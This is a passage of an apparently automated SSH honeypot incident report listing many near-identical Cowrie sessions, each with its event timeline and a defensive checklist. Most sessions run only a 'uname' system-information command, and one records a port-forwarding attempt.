| `2026-08-08 07:00:43` | `cowrie.client.version` |
| `2026-08-08 07:00:43` | `cowrie.client.kex` |
| `2026-08-08 07:00:44` | `cowrie.login.success` |
| `2026-08-08 07:00:45` | `cowrie.session.params` |
| `2026-08-08 07:00:45` | `cowrie.command.input` |
| `2026-08-08 07:00:45` | `cowrie.log.closed` |
| `2026-08-08 07:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ed525c1736d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:47` | `cowrie.session.connect` |
| `2026-08-08 07:00:47` | `cowrie.client.version` |
| `2026-08-08 07:00:47` | `cowrie.client.kex` |
| `2026-08-08 07:00:48` | `cowrie.login.success` |
| `2026-08-08 07:00:49` | `cowrie.session.params` |
| `2026-08-08 07:00:49` | `cowrie.command.input` |
| `2026-08-08 07:00:49` | `cowrie.log.closed` |
| `2026-08-08 07:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fe8b3732268

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:51` | `cowrie.session.connect` |
| `2026-08-08 07:00:51` | `cowrie.client.version` |
| `2026-08-08 07:00:51` | `cowrie.client.kex` |
| `2026-08-08 07:00:52` | `cowrie.login.success` |
| `2026-08-08 07:00:53` | `cowrie.session.params` |
| `2026-08-08 07:00:53` | `cowrie.command.input` |
| `2026-08-08 07:00:53` | `cowrie.log.closed` |
| `2026-08-08 07:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e25dc1c4a53

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:55` | `cowrie.session.connect` |
| `2026-08-08 07:00:55` | `cowrie.client.version` |
| `2026-08-08 07:00:56` | `cowrie.client.kex` |
| `2026-08-08 07:00:56` | `cowrie.login.success` |
| `2026-08-08 07:00:57` | `cowrie.session.params` |
| `2026-08-08 07:00:57` | `cowrie.command.input` |
| `2026-08-08 07:00:57` | `cowrie.log.closed` |
| `2026-08-08 07:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a089299fcd9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:00` | `cowrie.session.connect` |
| `2026-08-08 07:01:00` | `cowrie.client.version` |
| `2026-08-08 07:01:00` | `cowrie.client.kex` |
| `2026-08-08 07:01:00` | `cowrie.login.success` |
| `2026-08-08 07:01:01` | `cowrie.session.params` |
| `2026-08-08 07:01:01` | `cowrie.command.input` |
| `2026-08-08 07:01:01` | `cowrie.log.closed` |
| `2026-08-08 07:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14bbc47dbe88

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:03` | `cowrie.session.connect` |
| `2026-08-08 07:01:04` | `cowrie.client.version` |
| `2026-08-08 07:01:04` | `cowrie.client.kex` |
| `2026-08-08 07:01:04` | `cowrie.login.success` |
| `2026-08-08 07:01:05` | `cowrie.session.params` |
| `2026-08-08 07:01:05` | `cowrie.command.input` |
| `2026-08-08 07:01:05` | `cowrie.log.closed` |
| `2026-08-08 07:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c35eabf6333

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:08` | `cowrie.session.connect` |
| `2026-08-08 07:01:08` | `cowrie.client.version` |
| `2026-08-08 07:01:08` | `cowrie.client.kex` |
| `2026-08-08 07:01:08` | `cowrie.login.success` |
| `2026-08-08 07:01:09` | `cowrie.session.params` |
| `2026-08-08 07:01:09` | `cowrie.command.input` |
| `2026-08-08 07:01:09` | `cowrie.log.closed` |
| `2026-08-08 07:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3de453fceae

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:12` | `cowrie.session.connect` |
| `2026-08-08 07:01:12` | `cowrie.client.version` |
| `2026-08-08 07:01:12` | `cowrie.client.kex` |
| `2026-08-08 07:01:12` | `cowrie.login.success` |
| `2026-08-08 07:01:13` | `cowrie.session.params` |
| `2026-08-08 07:01:13` | `cowrie.command.input` |
| `2026-08-08 07:01:13` | `cowrie.log.closed` |
| `2026-08-08 07:01:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ce3afa37ec

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:16` | `cowrie.session.connect` |
| `2026-08-08 07:01:16` | `cowrie.client.version` |
| `2026-08-08 07:01:16` | `cowrie.client.kex` |
| `2026-08-08 07:01:16` | `cowrie.login.success` |
| `2026-08-08 07:01:17` | `cowrie.session.params` |
| `2026-08-08 07:01:17` | `cowrie.command.input` |
| `2026-08-08 07:01:17` | `cowrie.log.closed` |
| `2026-08-08 07:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77eec03acc33

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:20` | `cowrie.session.connect` |
| `2026-08-08 07:01:20` | `cowrie.client.version` |
| `2026-08-08 07:01:20` | `cowrie.client.kex` |
| `2026-08-08 07:01:20` | `cowrie.login.success` |
| `2026-08-08 07:01:21` | `cowrie.session.params` |
| `2026-08-08 07:01:21` | `cowrie.command.input` |
| `2026-08-08 07:01:21` | `cowrie.log.closed` |
| `2026-08-08 07:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87fe6574aa28

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:24` | `cowrie.session.connect` |
| `2026-08-08 07:01:24` | `cowrie.client.version` |
| `2026-08-08 07:01:24` | `cowrie.client.kex` |
| `2026-08-08 07:01:25` | `cowrie.login.success` |
| `2026-08-08 07:01:25` | `cowrie.session.params` |
| `2026-08-08 07:01:25` | `cowrie.command.input` |
| `2026-08-08 07:01:26` | `cowrie.log.closed` |
| `2026-08-08 07:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e17c562188cb

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:28` | `cowrie.session.connect` |
| `2026-08-08 07:01:28` | `cowrie.client.version` |
| `2026-08-08 07:01:28` | `cowrie.client.kex` |
| `2026-08-08 07:01:29` | `cowrie.login.success` |
| `2026-08-08 07:01:29` | `cowrie.session.params` |
| `2026-08-08 07:01:29` | `cowrie.command.input` |
| `2026-08-08 07:01:29` | `cowrie.log.closed` |
| `2026-08-08 07:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60cc79fd43ec

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:32` | `cowrie.session.connect` |
| `2026-08-08 07:01:32` | `cowrie.client.version` |
| `2026-08-08 07:01:32` | `cowrie.client.kex` |
| `2026-08-08 07:01:33` | `cowrie.login.success` |
| `2026-08-08 07:01:34` | `cowrie.session.params` |
| `2026-08-08 07:01:34` | `cowrie.command.input` |
| `2026-08-08 07:01:34` | `cowrie.log.closed` |
| `2026-08-08 07:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f79d8d0e7f9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:36` | `cowrie.session.connect` |
| `2026-08-08 07:01:36` | `cowrie.client.version` |
| `2026-08-08 07:01:37` | `cowrie.client.kex` |
| `2026-08-08 07:01:37` | `cowrie.login.success` |
| `2026-08-08 07:01:38` | `cowrie.session.params` |
| `2026-08-08 07:01:38` | `cowrie.command.input` |
| `2026-08-08 07:01:38` | `cowrie.log.closed` |
| `2026-08-08 07:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af18a29d499c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:40` | `cowrie.session.connect` |
| `2026-08-08 07:01:40` | `cowrie.client.version` |
| `2026-08-08 07:01:41` | `cowrie.client.kex` |
| `2026-08-08 07:01:41` | `cowrie.login.success` |
| `2026-08-08 07:01:42` | `cowrie.session.params` |
| `2026-08-08 07:01:42` | `cowrie.command.input` |
| `2026-08-08 07:01:42` | `cowrie.log.closed` |
| `2026-08-08 07:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6076d157ffe

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:45` | `cowrie.session.connect` |
| `2026-08-08 07:01:45` | `cowrie.client.version` |
| `2026-08-08 07:01:45` | `cowrie.client.kex` |
| `2026-08-08 07:01:45` | `cowrie.login.success` |
| `2026-08-08 07:01:46` | `cowrie.session.params` |
| `2026-08-08 07:01:46` | `cowrie.command.input` |
| `2026-08-08 07:01:46` | `cowrie.log.closed` |
| `2026-08-08 07:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d937ab1394f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:49` | `cowrie.session.connect` |
| `2026-08-08 07:01:49` | `cowrie.client.version` |
| `2026-08-08 07:01:49` | `cowrie.client.kex` |
| `2026-08-08 07:01:49` | `cowrie.login.success` |
| `2026-08-08 07:01:50` | `cowrie.session.params` |
| `2026-08-08 07:01:50` | `cowrie.command.input` |
| `2026-08-08 07:01:50` | `cowrie.log.closed` |
| `2026-08-08 07:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-884b814247b0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:52` | `cowrie.session.connect` |
| `2026-08-08 07:01:52` | `cowrie.client.version` |
| `2026-08-08 07:01:53` | `cowrie.client.kex` |
| `2026-08-08 07:01:53` | `cowrie.login.success` |
| `2026-08-08 07:01:54` | `cowrie.session.params` |
| `2026-08-08 07:01:54` | `cowrie.command.input` |
| `2026-08-08 07:01:54` | `cowrie.log.closed` |
| `2026-08-08 07:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a03d07e6fde

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:01 |
| **Last Seen** | 2026-08-08 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:01:57` | `cowrie.session.connect` |
| `2026-08-08 07:01:57` | `cowrie.client.version` |
| `2026-08-08 07:01:57` | `cowrie.client.kex` |
| `2026-08-08 07:01:57` | `cowrie.login.success` |
| `2026-08-08 07:01:58` | `cowrie.session.params` |
| `2026-08-08 07:01:58` | `cowrie.command.input` |
| `2026-08-08 07:01:58` | `cowrie.log.closed` |
| `2026-08-08 07:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e77669c55b8

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:01` | `cowrie.session.connect` |
| `2026-08-08 07:02:01` | `cowrie.client.version` |
| `2026-08-08 07:02:01` | `cowrie.client.kex` |
| `2026-08-08 07:02:01` | `cowrie.login.success` |
| `2026-08-08 07:02:02` | `cowrie.session.params` |
| `2026-08-08 07:02:02` | `cowrie.command.input` |
| `2026-08-08 07:02:02` | `cowrie.log.closed` |
| `2026-08-08 07:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-485633fd2ea5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:02` | `cowrie.session.connect` |
| `2026-08-08 07:02:02` | `cowrie.client.version` |
| `2026-08-08 07:02:02` | `cowrie.client.kex` |
| `2026-08-08 07:02:02` | `cowrie.login.success` |
| `2026-08-08 07:02:02` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:02:03` | `cowrie.direct-tcpip.data` |
| `2026-08-08 07:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb4183ee6d4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:05` | `cowrie.session.connect` |
| `2026-08-08 07:02:05` | `cowrie.client.version` |
| `2026-08-08 07:02:05` | `cowrie.client.kex` |
| `2026-08-08 07:02:05` | `cowrie.login.success` |
| `2026-08-08 07:02:06` | `cowrie.session.params` |
| `2026-08-08 07:02:06` | `cowrie.command.input` |
| `2026-08-08 07:02:06` | `cowrie.log.closed` |
| `2026-08-08 07:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4717e1f471

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:09` | `cowrie.session.connect` |
| `2026-08-08 07:02:09` | `cowrie.client.version` |
| `2026-08-08 07:02:09` | `cowrie.client.kex` |
| `2026-08-08 07:02:09` | `cowrie.login.success` |
| `2026-08-08 07:02:10` | `cowrie.session.params` |
| `2026-08-08 07:02:10` | `cowrie.command.input` |
| `2026-08-08 07:02:10` | `cowrie.log.closed` |
| `2026-08-08 07:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ed54c5e1403

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:13` | `cowrie.session.connect` |
| `2026-08-08 07:02:13` | `cowrie.client.version` |
| `2026-08-08 07:02:13` | `cowrie.client.kex` |
| `2026-08-08 07:02:13` | `cowrie.login.success` |
| `2026-08-08 07:02:14` | `cowrie.session.params` |
| `2026-08-08 07:02:14` | `cowrie.command.input` |
| `2026-08-08 07:02:14` | `cowrie.log.closed` |
| `2026-08-08 07:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6993cb7b261e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:17` | `cowrie.session.connect` |
| `2026-08-08 07:02:17` | `cowrie.client.version` |
| `2026-08-08 07:02:17` | `cowrie.client.kex` |
| `2026-08-08 07:02:17` | `cowrie.login.success` |
| `2026-08-08 07:02:18` | `cowrie.session.params` |
| `2026-08-08 07:02:18` | `cowrie.command.input` |
| `2026-08-08 07:02:18` | `cowrie.log.closed` |
| `2026-08-08 07:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9343ce1a942

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:21` | `cowrie.session.connect` |
| `2026-08-08 07:02:21` | `cowrie.client.version` |
| `2026-08-08 07:02:21` | `cowrie.client.kex` |
| `2026-08-08 07:02:21` | `cowrie.login.success` |
| `2026-08-08 07:02:22` | `cowrie.session.params` |
| `2026-08-08 07:02:22` | `cowrie.command.input` |
| `2026-08-08 07:02:22` | `cowrie.log.closed` |
| `2026-08-08 07:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d259cb4481e2

| Field | Detail |
